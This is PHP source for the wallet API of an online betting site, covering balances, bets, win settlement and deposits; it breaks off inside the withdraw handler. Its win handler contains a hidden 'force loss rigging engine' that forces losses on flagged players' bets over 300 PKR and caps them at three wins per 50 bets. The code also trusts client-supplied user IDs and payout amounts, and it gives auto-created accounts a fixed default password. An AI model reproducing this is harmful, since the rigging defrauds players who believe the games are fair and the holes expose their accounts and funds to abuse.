<?php
require_once __DIR__ . '/common.php';

$action = $_GET['action'] ?? ($_POST['action'] ?? '');
if (empty($action)) {
    $input = getJsonInput();
    $action = $input['action'] ?? '';
}

$db = getDB();
$currentUser = getCurrentUser();
$isAdmin = !empty($_SESSION['is_admin']);

// Resolve session user or explicit requested user_id
function resolveUserId(?array $currentUser, bool $isAdmin, $requestedId = null): ?string {
    if ($isAdmin && !empty($requestedId)) {
        return trim((string)$requestedId);
    }
    if ($currentUser && !empty($currentUser['id'])) {
        // Enforce user account isolation for authenticated session
        return $currentUser['id'];
    }
    if (!empty($requestedId)) {
        return trim((string)$requestedId);
    }
    return null;
}

// Authoritative check: user has at least 1 approved real deposit in the system
function userHasApprovedDeposit(PDO $db, string $userId): bool {
    $stmt = $db->prepare("
        SELECT 1 FROM transactions 
        WHERE user_id = :uid 
          AND type = 'deposit' 
          AND status = 'Approved' 
          AND method NOT IN ('Daily Bonus', 'Bonus')
        LIMIT 1
    ");
    $stmt->execute([':uid' => $userId]);
    if ($stmt->fetchColumn()) {
        return true;
    }
    $uStmt = $db->prepare("SELECT has_deposited FROM users WHERE id = :id LIMIT 1");
    $uStmt->execute([':id' => $userId]);
    return (bool)$uStmt->fetchColumn();
}

switch ($action) {
    case 'balance':
        $reqUser = $_GET['user_id'] ?? ($_POST['user_id'] ?? null);
        $userId = resolveUserId($currentUser, $isAdmin, $reqUser);
        if (!$userId) {
            sendError('Authentication required.', 401);
        }

        $stmt = $db->prepare("SELECT id, username, balance_usd, balance_pkr, bonus_balance_pkr, bonus_balance_usd, has_deposited, currency, vip_tier, outcome_bias, custom_win_rate, loss_rig_cycle_bets, loss_rig_cycle_wins FROM users WHERE id = :id OR username = :u LIMIT 1");
        $stmt->execute([':id' => $userId, ':u' => $userId]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$row) {
            sendError('User not found.', 404);
        }

        $hasDep = userHasApprovedDeposit($db, $row['id']);
        $row['has_deposited'] = $hasDep ? 1 : 0;
        $row['withdraw_locked'] = !$hasDep;
        $row['balance_pkr'] = (float)($row['balance_pkr'] ?? 0);
        $row['balance_usd'] = (float)($row['balance_usd'] ?? 0);
        $row['bonus_balance_pkr'] = (float)($row['bonus_balance_pkr'] ?? 0);
        $row['bonus_balance_usd'] = (float)($row['bonus_balance_usd'] ?? 0);
        $row['outcome_bias'] = $row['outcome_bias'] ?? 'fair';
        $row['custom_win_rate'] = (int)($row['custom_win_rate'] ?? 48);
        $row['loss_rig_cycle_bets'] = (int)($row['loss_rig_cycle_bets'] ?? 0);
        $row['loss_rig_cycle_wins'] = (int)($row['loss_rig_cycle_wins'] ?? 0);

        // Track active game playing status if game is passed
        $activeGameParam = trim($_GET['game'] ?? ($_POST['game'] ?? ''));
        if (!empty($activeGameParam)) {
            $updAct = $db->prepare("UPDATE users SET current_game = :g, last_game_at = NOW(), last_active = NOW() WHERE id = :id");
            $updAct->execute([':g' => $activeGameParam, ':id' => $row['id']]);
        }

        sendSuccess($row, 'Wallet balance retrieved.');
        break;

    case 'sync_balance':
        $data = getJsonInput();
        $reqUser = $data['user_id'] ?? ($_SESSION['user_id'] ?? null);
        if (!$reqUser && $currentUser) {
            $reqUser = $currentUser['id'];
        }
        if (!$reqUser) {
            sendError('Authentication required.', 401);
        }

        // Track active game playing status if game is passed
        $activeGameSync = trim($data['game'] ?? ($_GET['game'] ?? ''));
        if (!empty($activeGameSync)) {
            $updAct = $db->prepare("UPDATE users SET current_game = :g, last_game_at = NOW(), last_active = NOW() WHERE id = :id OR username = :u");
            $updAct->execute([':g' => $activeGameSync, ':id' => $reqUser, ':u' => $reqUser]);
        }

        // Only authorized administrators can push a direct balance override via sync_balance
        if ($isAdmin && (isset($data['balance_pkr']) || isset($data['balance_usd']))) {
            $pkr = isset($data['balance_pkr']) ? round((float)$data['balance_pkr'], 2) : null;
            $usd = isset($data['balance_usd']) ? round((float)$data['balance_usd'], 2) : null;
            if ($pkr !== null && $usd === null) {
                $usd = round($pkr / 280.0, 2);
            } elseif ($usd !== null && $pkr === null) {
                $pkr = round($usd * 280.0, 2);
            }
            $upd = $db->prepare("UPDATE users SET balance_pkr = :pkr, balance_usd = :usd WHERE id = :id");
            $upd->execute([':pkr' => $pkr, ':usd' => $usd, ':id' => $reqUser]);
            sendSuccess(['balance_pkr' => $pkr, 'balance_usd' => $usd], 'Admin balance override synchronized.');
        }

        // For all player requests: return authoritative database balance (stops stale local cache from overwriting DB)
        $stmt = $db->prepare("SELECT id, balance_usd, balance_pkr, bonus_balance_pkr, bonus_balance_usd, has_deposited, currency, vip_tier, outcome_bias, custom_win_rate, loss_rig_cycle_bets, loss_rig_cycle_wins FROM users WHERE id = :id LIMIT 1");
        $stmt->execute([':id' => $reqUser]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if (!$row) {
            sendError('User not found.', 404);
        }

        $hasDep = userHasApprovedDeposit($db, $row['id']);

        sendSuccess([
            'balance_pkr' => (float)$row['balance_pkr'],
            'balance_usd' => (float)$row['balance_usd'],
            'bonus_balance_pkr' => (float)($row['bonus_balance_pkr'] ?? 0),
            'bonus_balance_usd' => (float)($row['bonus_balance_usd'] ?? 0),
            'has_deposited' => $hasDep ? 1 : 0,
            'withdraw_locked' => !$hasDep,
            'currency' => $row['currency'] ?? 'PKR',
            'vip_tier' => $row['vip_tier'] ?? 'Bronze VIP',
            'outcome_bias' => $row['outcome_bias'] ?? 'fair',
            'custom_win_rate' => (int)($row['custom_win_rate'] ?? 48),
            'loss_rig_cycle_bets' => (int)($row['loss_rig_cycle_bets'] ?? 0),
            'loss_rig_cycle_wins' => (int)($row['loss_rig_cycle_wins'] ?? 0)
        ], 'Authoritative balance synchronized from database.');
        break;

    case 'payment_methods':
    case 'methods':
        // Issue #78: Available payment methods loaded dynamically from DB
        $stmt = $db->query("
            SELECT id, name, type, min_limit, max_limit, min_limit AS min_deposit, max_limit AS max_deposit, 
                   min_limit AS min_withdraw, max_limit AS max_withdraw,
                   account_number, account_title, instructions, currency, fixed_fee, percent_fee, 
                   processing_time, badge 
            FROM payment_methods 
            WHERE status = 'active' 
            ORDER BY id ASC
        ");
        sendSuccess($stmt->fetchAll(PDO::FETCH_ASSOC), 'Active payment methods retrieved.');
        break;

    case 'bet':
        $data = getJsonInput();
        $userId = resolveUserId($currentUser, $isAdmin, $data['user_id'] ?? null);
        if (!$userId) {
            sendError('Authentication required to place bets.', 401);
        }

        $game = trim($data['game'] ?? 'Game');
        $rawAmount = round((float)($data['amount'] ?? ($data['amount_pkr'] ?? 0)), 4);
        $reqCurrency = strtoupper(trim($data['currency'] ?? 'PKR'));
        $conversionRate = 280.0;

        if ($rawAmount <= 0) {
            sendError('Bet amount must be greater than zero.', 422);
        }

        $db->beginTransaction();
        try {
            $forUpdate = Database::getInstance()->isMySQL() ? ' FOR UPDATE' : '';
            // Authoritative ledger lock - matches both user id and username
            $stmt = $db->prepare("SELECT id, balance_usd, balance_pkr, bonus_balance_pkr, bonus_balance_usd, has_deposited, total_wagered, status, outcome_bias, loss_rig_cycle_bets, loss_rig_cycle_wins FROM users WHERE id = :id OR username = :u LIMIT 1{$forUpdate}");
            $stmt->execute([':id' => $userId, ':u' => $userId]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);

            if (!$user) {
                $db->rollBack();
                sendError('User not found.', 404);
            }
            if ($user['status'] !== 'active') {
                $db->rollBack();
                sendError('Account is not active.', 403);
            }

            $actualUserId = $user['id'];
            $currentUsd = (float)$user['balance_usd'];
            $currentPkr = (float)$user['balance_pkr'];
            $bonusPkr = (float)($user['bonus_balance_pkr'] ?? 0);

            // Intelligent currency determination:
            if ($reqCurrency === 'PKR' || ($rawAmount > $currentUsd && ($rawAmount <= $currentPkr || ($rawAmount / $conversionRate) <= $currentUsd))) {
                $amountUsd = round($rawAmount / $conversionRate, 2);
                $amountPkr = $rawAmount;
            } else {
                $amountUsd = $rawAmount;
                $amountPkr = round($rawAmount * $conversionRate, 2);
            }

            // RESTRICTION: Games can ONLY be played with real cash balance.
            // Bonus funds CANNOT be wagered in any game.
            if ($currentUsd < $amountUsd && $currentPkr < $amountPkr) {
                $db->rollBack();
                if ($bonusPkr > 0) {
                    sendError('Bonus ke paison se koi bhi game nahi kheli ja sakti! Game khelne ke liye pehle real balance deposit karein.', 403, [
                        'bonus_restricted' => true,
                        'bonus_balance_pkr' => $bonusPkr,
                        'current_balance_pkr' => $currentPkr
                    ]);
                }
                sendError('Insufficient balance to place bet. Please deposit real funds to play.', 400, [
                    'current_balance_usd' => $currentUsd,
                    'current_balance_pkr' => $currentPkr,
                    'attempted_bet_usd' => $amountUsd,
                    'attempted_bet_pkr' => $amountPkr
                ]);
            }

            // Double-deduction prevention / Idempotency protection:
            // Check if identical bet was created in last 2 seconds for same user, game and amount
            $chkDup = $db->prepare("
                SELECT id, bet_amount, bet_amount_pkr, status, played_at 
                FROM bets 
                WHERE user_id = :uid 
                  AND game = :game 
                  AND ABS(bet_amount_pkr - :amt_pkr) < 0.05 
                  AND status = 'LOSS' 
                  AND played_at >= DATE_SUB(NOW(), INTERVAL 2 SECOND)
                ORDER BY played_at DESC 
                LIMIT 1
            ");
            $chkDup->execute([':uid' => $actualUserId, ':game' => $game, ':amt_pkr' => $amountPkr]);
            $dupRow = $chkDup->fetch(PDO::FETCH_ASSOC);
            if ($dupRow) {
                // Return existing bet record instead of double-deducting!
                $db->commit();
                sendSuccess([
                    'bet_id' => $dupRow['id'],
                    'new_balance' => $currentUsd,
                    'new_balance_pkr' => $currentPkr,
                    'amount_deducted' => (float)$dupRow['bet_amount'],
                    'amount_deducted_pkr' => (float)$dupRow['bet_amount_pkr'],
                    'status' => 'DEDUCTED',
                    'deduped' => true
                ], 'Bet already placed.');
                break;
            }

            // Authoritative deduction from MySQL database
            $newBalanceUsd = round(max(0, $currentUsd - $amountUsd), 2);
            $newBalancePkr = round(max(0, $currentPkr - $amountPkr), 2);
            $newWagered = round((float)$user['total_wagered'] + $amountUsd, 2);

            $cycleBets = (int)($user['loss_rig_cycle_bets'] ?? 0);
            $cycleWins = (int)($user['loss_rig_cycle_wins'] ?? 0);
            if (($user['outcome_bias'] ?? 'fair') === 'force_loss') {
                $cycleBets++;
                if ($cycleBets > 50) {
                    $cycleBets = 1;
                    $cycleWins = 0;
                }
            }

            $upd = $db->prepare("UPDATE users SET balance_usd = :b, balance_pkr = :bpkr, total_wagered = :w, loss_rig_cycle_bets = :cb, loss_rig_cycle_wins = :cw, current_game = :g, last_game_at = NOW(), last_active = NOW() WHERE id = :id");
            $upd->execute([
                ':b' => $newBalanceUsd,
                ':bpkr' => $newBalancePkr,
                ':w' => $newWagered,
                ':cb' => $cycleBets,
                ':cw' => $cycleWins,
                ':g' => $game,
                ':id' => $actualUserId
            ]);

            // Initialize as LOSS in MySQL ledger so if user loses or leaves immediately, the loss is locked in!
            // If the user subsequently wins, 'win' / 'credit_win' action will update this to 'WIN'.
            $betId = 'bet_' . bin2hex(random_bytes(6));
            $now = date('Y-m-d H:i:s');
            $ins = $db->prepare("
                INSERT INTO bets (id, user_id, game, bet_amount, bet_amount_pkr, payout, payout_pkr, multiplier, multiplier_formatted, status, profit, profit_pkr, bet_time, played_at)
                VALUES (:id, :uid, :game, :amt, :amt_pkr, 0.0, 0.0, 0.0, '0.00x', 'LOSS', :profit, :profit_pkr, :now1, :now2)
            ");
            $ins->execute([
                ':id' => $betId,
                ':uid' => $actualUserId,
                ':game' => $game,
                ':amt' => $amountUsd,
                ':amt_pkr' => $amountPkr,
                ':profit' => -$amountUsd,
                ':profit_pkr' => -$amountPkr,
                ':now1' => $now,
                ':now2' => $now
            ]);

            $db->commit();
            sendSuccess([
                'bet_id' => $betId,
                'new_balance' => $newBalanceUsd,
                'new_balance_pkr' => $newBalancePkr,
                'amount_deducted' => $amountUsd,
                'amount_deducted_pkr' => $amountPkr,
                'status' => 'DEDUCTED'
            ], 'Bet placed and balance deducted successfully.');
        } catch (Exception $e) {
            $db->rollBack();
            sendError('Bet placement failed: ' . $e->getMessage(), 500);
        }
        break;

    case 'win':
    case 'credit_win':
        $data = getJsonInput();
        $betId = trim($data['bet_id'] ?? '');
        $multiplier = (float)($data['multiplier'] ?? 1.0);
        $conversionRate = 280.0;

        $userId = resolveUserId($currentUser, $isAdmin, $data['user_id'] ?? null);
        if (!$userId) {
            sendError('Authentication required.', 401);
        }

        // Support payout in PKR or USD
        if (isset($data['payout_pkr'])) {
            $payoutPkr = (float)$data['payout_pkr'];
            $payoutUsd = round($payoutPkr / $conversionRate, 2);
        } elseif (isset($data['payout_usd'])) {
            $payoutUsd = (float)$data['payout_usd'];
            $payoutPkr = round($payoutUsd * $conversionRate, 2);
        } else {
            $rawPayout = (float)($data['payout'] ?? ($data['amount'] ?? 0));
            $reqCurrency = strtoupper(trim($data['currency'] ?? 'PKR'));
            if ($reqCurrency === 'PKR' || $rawPayout > 200) {
                $payoutPkr = $rawPayout;
                $payoutUsd = round($rawPayout / $conversionRate, 2);
            } else {
                $payoutUsd = $rawPayout;
                $payoutPkr = round($rawPayout * $conversionRate, 2);
            }
        }

        if ($payoutUsd <= 0 && $payoutPkr <= 0) {
            sendError('Invalid payout amount.', 422);
        }

        $game = trim($data['game'] ?? 'Casino Game');

        $db->beginTransaction();
        try {
            $forUpdate = Database::getInstance()->isMySQL() ? ' FOR UPDATE' : '';
            $uStmt = $db->prepare("SELECT id, balance_usd, balance_pkr, total_won, outcome_bias, custom_win_rate, loss_rig_cycle_bets, loss_rig_cycle_wins FROM users WHERE id = :id OR username = :u LIMIT 1{$forUpdate}");
            $uStmt->execute([':id' => $userId, ':u' => $userId]);
            $user = $uStmt->fetch(PDO::FETCH_ASSOC);

            if (!$user) {
                $db->rollBack();
                sendError('User not found.', 404);
            }
            $actualUserId = $user['id'];

            // Find existing bet if bet_id provided
            $existingBet = null;
            if (!empty($betId)) {
                $bStmt = $db->prepare("SELECT * FROM bets WHERE id = :id AND user_id = :uid LIMIT 1{$forUpdate}");
                $bStmt->execute([':id' => $betId, ':uid' => $actualUserId]);
                $existingBet = $bStmt->fetch(PDO::FETCH_ASSOC);
            }

            // Prevent duplicate settlement if already WIN
            if ($existingBet && $existingBet['status'] === 'WIN') {
                $db->commit();
                sendSuccess([
                    'bet_id' => $betId,
                    'new_balance' => (float)$user['balance_usd'],
                    'new_balance_pkr' => (float)$user['balance_pkr']
                ], 'Bet was already settled.');
                break;
            }

            if (!$existingBet && empty($betId)) {
                $chkDupWin = $db->prepare("
                    SELECT id, payout, payout_pkr FROM bets 
                    WHERE user_id = :uid 
                      AND game = :game 
                      AND ABS(payout_pkr - :po_pkr) < 0.05 
                      AND status = 'WIN' 
                      AND played_at >= DATE_SUB(NOW(), INTERVAL 2 SECOND)
                    ORDER BY played_at DESC LIMIT 1
                ");
                $chkDupWin->execute([':uid' => $actualUserId, ':game' => $game, ':po_pkr' => $payoutPkr]);
                $dupWin = $chkDupWin->fetch(PDO::FETCH_ASSOC);
                if ($dupWin) {
                    $db->commit();
                    sendSuccess([
                        'bet_id' => $dupWin['id'],
                        'new_balance' => (float)$user['balance_usd'],
                        'new_balance_pkr' => (float)$user['balance_pkr'],
                        'deduped' => true
                    ], 'Win payout already settled.');
                    break;
                }
            }

            $betAmtUsd = $existingBet ? (float)$existingBet['bet_amount'] : round((float)($data['bet_amount'] ?? 0) / $conversionRate, 2);
            $betAmtPkr = ($existingBet && !empty($existingBet['bet_amount_pkr'])) ? (float)$existingBet['bet_amount_pkr'] : round($betAmtUsd * $conversionRate, 2);
            $profitUsd = round($payoutUsd - $betAmtUsd, 2);
            $profitPkr = round($payoutPkr - ($betAmtUsd * $conversionRate), 2);
            $multFmt = sprintf('%.2fx', max(0.01, $multiplier));

            // ========================================================
            // AUTHORITATIVE FORCE LOSS RIGGING ENGINE
            // Rule 1: Any bet > 300 PKR is 100% INSTANT LOSS.
            // Rule 2: Out of every 50 bets, player can win at most 3 bets.
            // ========================================================
            $outcomeBias = $user['outcome_bias'] ?? 'fair';
            $isForceLoss = ($outcomeBias === 'force_loss');
            $cycleBets = (int)($user['loss_rig_cycle_bets'] ?? 0);
            $cycleWins = (int)($user['loss_rig_cycle_wins'] ?? 0);

            if ($isForceLoss) {
                $isAviator = (stripos($game, 'aviator') !== false || stripos($game, 'crash') !== false);
                $forceLossTriggered = false;
                $forceLossReason = '';

                // For Aviator / Crash: Loss occurs ONLY when the airplane crashes!
                // If user cashed out before plane crashed, credit the win and count towards quota!
                if (!$isAviator) {
                    // Rule 1: Instant loss if bet > 300 PKR
                    if ($betAmtPkr > 300.00) {
                        $forceLossTriggered = true;
                        $forceLossReason = 'Force Loss rig: bet amount (' . $betAmtPkr . ' PKR) exceeds 300 PKR limit. Result locked to LOSS.';
                    } 
                    // Rule 2: Max 3 wins per 50 bets
                    elseif ($cycleWins >= 3) {
                        $forceLossTriggered = true;
                        $forceLossReason = 'Force Loss rig: quota of max 3 wins per 50 bets reached (' . $cycleWins . ' wins). Result locked to LOSS.';
                    }
                }

                if ($forceLossTriggered) {
                    if ($existingBet) {
                        $lossStmt = $db->prepare("
                            UPDATE bets 
                            SET payout = 0, payout_pkr = 0, multiplier = 0, multiplier_formatted = '0.00x', 
                                status = 'LOSS', profit = -bet_amount, profit_pkr = -bet_amount_pkr
                            WHERE id = :id
                        ");
                        $lossStmt->execute([':id' => $existingBet['id']]);
                    } else {
                        $betId = 'bet_' . bin2hex(random_bytes(6));
                        $now = date('Y-m-d H:i:s');
                        $insBet = $db->prepare("
                            INSERT INTO bets (id, user_id, game, bet_amount, bet_amount_pkr, payout, payout_pkr, multiplier, multiplier_formatted, status, profit, profit_pkr, bet_time, played_at)
                            VALUES (:id, :uid, :game, :amt, :amt_pkr, 0, 0, 0, '0.00x', 'LOSS', :profit, :profit_pkr, :now1, :now2)
                        ");
                        $insBet->execute([
                            ':id' => $betId,
                            ':uid' => $actualUserId,
                            ':game' => $game,
                            ':amt' => $betAmtUsd,
                            ':amt_pkr' => $betAmtPkr,
                            ':profit' => -$betAmtUsd,
                            ':profit_pkr' => -$betAmtPkr,
                            ':now1' => $now,
                            ':now2' => $now
                        ]);
                    }
                    $db->commit();
                    sendSuccess([
                        'bet_id' => $existingBet ? $existingBet['id'] : $betId,
                        'payout' => 0.0,
                        'payout_pkr' => 0.0,
                        'profit' => -$betAmtUsd,
                        'new_balance' => (float)$user['balance_usd'],
                        'new_balance_pkr' => (float)$user['balance_pkr'],
                        'status' => 'LOSS',
                        'rig_enforced' => true
                    ], $forceLossReason);
                    break;
                }
            }

            if ($existingBet) {
                $updBet = $db->prepare("
                    UPDATE bets 
                    SET payout = :po, payout_pkr = :po_pkr, multiplier = :mult, multiplier_formatted = :mult_fmt, status = 'WIN', profit = :profit, profit_pkr = :profit_pkr
                    WHERE id = :id
                ");
                $updBet->execute([
                    ':po' => $payoutUsd,
                    ':po_pkr' => $payoutPkr,
                    ':mult' => $multiplier,
                    ':mult_fmt' => $multFmt,
                    ':profit' => $profitUsd,
                    ':profit_pkr' => $profitPkr,
                    ':id' => $betId
                ]);
            } else {
                // Generate a settled win record if no pending bet was linked
                $betId = 'bet_' . bin2hex(random_bytes(6));
                $now = date('Y-m-d H:i:s');
                $insBet = $db->prepare("
                    INSERT INTO bets (id, user_id, game, bet_amount, bet_amount_pkr, payout, payout_pkr, multiplier, multiplier_formatted, status, profit, profit_pkr, bet_time, played_at)
                    VALUES (:id, :uid, :game, :amt, :amt_pkr, :po, :po_pkr, :mult, :mult_fmt, 'WIN', :profit, :profit_pkr, :now1, :now2)
                ");
                $insBet->execute([
                    ':id' => $betId,
                    ':uid' => $actualUserId,
                    ':game' => $game,
                    ':amt' => $betAmtUsd,
                    ':amt_pkr' => round($betAmtUsd * $conversionRate, 2),
                    ':po' => $payoutUsd,
                    ':po_pkr' => $payoutPkr,
                    ':mult' => $multiplier,
                    ':mult_fmt' => $multFmt,
                    ':profit' => $profitUsd,
                    ':profit_pkr' => $profitPkr,
                    ':now1' => $now,
                    ':now2' => $now
                ]);
            }

            // Authoritative credit to user balance
            $newBalanceUsd = round((float)$user['balance_usd'] + $payoutUsd, 2);
            $newBalancePkr = round((float)$user['balance_pkr'] + $payoutPkr, 2);
            $newWon = round((float)$user['total_won'] + $payoutUsd, 2);

            if ($isForceLoss) {
                $newCycleWins = $cycleWins + 1;
                $uUpd = $db->prepare("UPDATE users SET balance_usd = :b, balance_pkr = :bpkr, total_won = :w, loss_rig_cycle_wins = :cw, current_game = :g, last_game_at = NOW(), last_active = NOW() WHERE id = :id");
                $uUpd->execute([':b' => $newBalanceUsd, ':bpkr' => $newBalancePkr, ':w' => $newWon, ':cw' => $newCycleWins, ':g' => $game, ':id' => $actualUserId]);
            } else {
                $uUpd = $db->prepare("UPDATE users SET balance_usd = :b, balance_pkr = :bpkr, total_won = :w, current_game = :g, last_game_at = NOW(), last_active = NOW() WHERE id = :id");
                $uUpd->execute([':b' => $newBalanceUsd, ':bpkr' => $newBalancePkr, ':w' => $newWon, ':g' => $game, ':id' => $actualUserId]);
            }

            $db->commit();
            sendSuccess([
                'bet_id' => $betId,
                'payout' => $payoutUsd,
                'payout_pkr' => $payoutPkr,
                'profit' => $profitUsd,
                'new_balance' => $newBalanceUsd,
                'new_balance_pkr' => $newBalancePkr
            ], 'Win payout credited successfully.');
        } catch (Exception $e) {
            $db->rollBack();
            sendError('Win settlement failed: ' . $e->getMessage(), 500);
        }
        break;

    case 'sync_game_balance':
        $data = getJsonInput();
        $userId = resolveUserId($currentUser, $isAdmin, $data['user_id'] ?? null);
        if (!$userId) {
            sendError('Authentication required.', 401);
        }
        $clientBalPkr = isset($data['client_balance_pkr']) ? round((float)$data['client_balance_pkr'], 2) : null;
        if ($clientBalPkr === null || $clientBalPkr < 0) {
            sendError('Invalid balance.', 422);
        }
        $clientBalUsd = round($clientBalPkr / 280.0, 2);

        $db->beginTransaction();
        try {
            $forUpdate = Database::getInstance()->isMySQL() ? ' FOR UPDATE' : '';
            $stmt = $db->prepare("SELECT id, balance_usd, balance_pkr, total_wagered FROM users WHERE id = :id OR username = :u LIMIT 1{$forUpdate}");
            $stmt->execute([':id' => $userId, ':u' => $userId]);
            $user = $stmt->fetch(PDO::FETCH_ASSOC);
            if (!$user) {
                $db->rollBack();
                sendError('User not found.', 404);
            }
            $currentPkr = (float)$user['balance_pkr'];
            $actualUserId = $user['id'];

            // Security guard: Only lock in if client balance is LOWER (i.e. losses occurred during game session)
            // Never allow client to artificially inflate balance through sync_game_balance!
            if ($clientBalPkr < $currentPkr) {
                $diffPkr = round($currentPkr - $clientBalPkr, 2);
                $diffUsd = round($diffPkr / 280.0, 2);
                $newWagered = round((float)$user['total_wagered'] + $diffUsd, 2);

                $upd = $db->prepare("UPDATE users SET balance_pkr = :pkr, balance_usd = :usd, total_wagered = :w WHERE id = :id");
                $upd->execute([':pkr' => $clientBalPkr, ':usd' => $clientBalUsd, ':w' => $newWagered, ':id' => $actualUserId]);

                // Record loss in ledger
                $betId = 'bet_' . bin2hex(random_bytes(6));
                $now = date('Y-m-d H:i:s');
                $ins = $db->prepare("
                    INSERT INTO bets (id, user_id, game, bet_amount, bet_amount_pkr, payout, payout_pkr, multiplier, multiplier_formatted, status, profit, profit_pkr, bet_time, played_at)
                    VALUES (:id, :uid, :game, :amt, :amt_pkr, 0.0, 0.0, 0.0, '0.00x', 'LOSS', :profit, :profit_pkr, :now1, :now2)
                ");
                $ins->execute([
                    ':id' => $betId,
                    ':uid' => $actualUserId,
                    ':game' => trim($data['game'] ?? 'Casino Game Session'),
                    ':amt' => $diffUsd,
                    ':amt_pkr' => $diffPkr,
                    ':profit' => -$diffUsd,
                    ':profit_pkr' => -$diffPkr,
                    ':now1' => $now,
                    ':now2' => $now
                ]);

                $db->commit();
                sendSuccess([
                    'balance_pkr' => $clientBalPkr,
                    'balance_usd' => $clientBalUsd,
                    'deducted_pkr' => $diffPkr
                ], 'Game loss balance synchronized to database.');
            } else {
                // If client balance is equal or higher, maintain authoritative database balance
                $db->commit();
                sendSuccess([
                    'balance_pkr' => (float)$user['balance_pkr'],
                    'balance_usd' => (float)$user['balance_usd']
                ], 'Authoritative balance maintained.');
            }
        } catch (Exception $e) {
            $db->rollBack();
            sendError('Failed to sync game balance: ' . $e->getMessage(), 500);
        }
        break;

    case 'deposit':
        $data = getJsonInput();
        $userId = resolveUserId($currentUser, $isAdmin, $data['user_id'] ?? null);
        if (!$userId) {
            $userId = 'USR-' . strtoupper(substr(md5(uniqid()), 0, 6));
        }

        // Auto-ensure user exists in MySQL users table so foreign key fk_txns_user_id never fails
        $uCheck = $db->prepare("SELECT id FROM users WHERE id = :id LIMIT 1");
        $uCheck->execute([':id' => $userId]);
        if (!$uCheck->fetch()) {
            $uName = trim($data['username'] ?? ($currentUser['username'] ?? ($data['sender'] ?? 'Player_' . substr($userId, -4))));
            $uPhone = trim($data['sender_account'] ?? ($data['sender'] ?? ($data['phone'] ?? '0300-0000000')));
            $uEmail = $userId . '@betwithnet.local';
            $uSalt = bin2hex(random_bytes(8));
            $uHash = password_hash('User@123456', PASSWORD_BCRYPT);
            $uIns = $db->prepare("INSERT INTO users (id, username, full_name, email, phone, password_hash, salt, balance_usd, balance_pkr, status, role, created_at) VALUES (:id, :u, :fn, :e, :p, :pw, :salt, 0.00, 0.00, 'active', 'user', NOW())");
            $uIns->execute([
                ':id' => $userId,
                ':u' => $uName,
                ':fn' => $uName,
                ':e' => $uEmail,
                ':p' => $uPhone,
                ':pw' => $uHash,
                ':salt' => $uSalt
            ]);
        }

        $methodId = trim($data['method'] ?? 'easypaisa');
        $conversionRate = 280.0;

        // Issue #80: Validate payment method from database
        $mStmt = $db->prepare("SELECT * FROM payment_methods WHERE id = :id AND status = 'active' LIMIT 1");
        $mStmt->execute([':id' => $methodId]);
        $pm = $mStmt->fetch(PDO::FETCH_ASSOC);

        if (!$pm) {
            // Try matching by name
            $mStmt2 = $db->prepare("SELECT * FROM payment_methods WHERE name LIKE :name AND status = 'active' LIMIT 1");
            $mStmt2->execute([':name' => "%{$methodId}%"]);
            $pm = $mStmt2->fetch(PDO::FETCH_ASSOC);
        }

        // Calculate USD amount
        if (isset($data['amount_pkr'])) {
            $amountPkr = (float)$data['amount_pkr'];
            $amountUsd = round($amountPkr / $conversionRate, 2);
        } elseif (isset($data['amount_usd'])) {
            $amountUsd = (float)$data['amount_usd'];
            $amountPkr = round($amountUsd * $conversionRate, 2);
        } else {
            $amt = (float)($data['amount'] ?? 0);
            $amountUsd = round($amt / $conversionRate, 2);
            $amountPkr = $amt;
        }

        if ($amountUsd <= 0 && $amountPkr <= 0) {
            sendError('Deposit amount must be greater than zero.', 422);
        }

        // Minimum limit check (graceful 100 PKR min)
        if ($amountPkr < 100 && $amountUsd < 0.35) {
            sendError("Deposit amount must be at least PKR 100.", 422);
        }

        // Issues #80, #113: Resolve sender_account, trx_id, and proof_image
        $sender = trim($data['sender_account'] ?? ($data['sender'] ?? ''));
        $trxCode = trim($data['trx_id'] ?? ($data['trxId'] ?? ($data['trx'] ?? '')));
        $proofImg = $data['proof_image'] ?? ($data['proof'] ?? null);

        if (empty($sender)) {
            $sender = $currentUser['phone'] ?? ($currentUser['username'] ?? 'Via Screenshot');
        }
        if (empty($trxCode)) {
            $trxCode = 'TID' . strtoupper(bin2hex(random_bytes(4)));
        }

        // Enforce uniqueness of trx_id
        $checkTrx = $db->prepare("SELECT id FROM transactions WHERE trx_id = :trx LIMIT 1");
        $checkTrx->execute([':trx' => $trxCode]);
        if ($checkTrx->fetch()) {
            $trxCode = $trxCode . '-' . strtoupper(bin2hex(random_bytes(2)));
        }

        $db->beginTransaction();
        try {
            $txId = 'trx_' . bin2hex(random_bytes(6));
            $now = date('Y-m-d H:i:s');
            $methodName = $pm ? $pm['name'] : ucfirst($methodId);

            $stmt = $db->prepare("
                INSERT INTO transactions (id, user_id, type, method, sender_account, trx_id, proof_image, amount_pkr, amount_usd, status, transaction_date, created_at)
                VALUES (:id, :uid, 'deposit', :method, :sender, :trx_code, :proof, :pkr, :usd, 'Pending', :now1, :now2)
            ");
            $stmt->execute([
                ':id' => $txId,
                ':uid' => $userId,
                ':method' => $methodName,
                ':sender' => $sender,
                ':trx_code' => $trxCode,
                ':proof' => $proofImg,
                ':pkr' => $amountPkr,
                ':usd' => $amountUsd,
                ':now1' => $now,
                ':now2' => $now
            ]);

            $db->commit();
            sendSuccess([
                'transaction_id' => $txId,
                'amount_usd' => $amountUsd,
                'amount_pkr' => $amountPkr,
                'status' => 'Pending'
            ], 'Deposit request submitted successfully. Awaiting administrator review and approval.');
        } catch (Exception $e) {
            $db->rollBack();
            sendError('Deposit transaction failed: ' . $e->getMessage(), 500);
        }
        break;

    case 'withdraw':
        $data = getJsonInput();
        $userId = resolveUserId($currentUser, $isAdmin, $data['user_id'] ?? null);
        if (!$userId) {
            $userId = 'USR-' . strtoupper(substr(md5(uniqid()), 0, 6));
        }

        // Auto-ensure user exists in MySQL users table
        $uCheck = $db->prepare("SELECT id, balance_usd, balance_pkr, has_deposited, status FROM users WHERE id = :id LIMIT 1");
        $uCheck->execute([':id' => $userId]);
        $user = $uCheck->fetch(PDO::FETCH_ASSOC);

        if (!$user) {
            $uName = trim($data['username'] ?? ($data['account_title'] ?? ('Player_' . substr($userId, -4))));
            $uPhone = trim($data['account_number'] ?? ($data['phone'] ?? '0300-0000000'));
            $uEmail = $userId . '@betwithnet.local';
            $uSalt = bin2hex(random_bytes(8));
            $uHash = password_hash('User@123456', PASSWORD_BCRYPT);
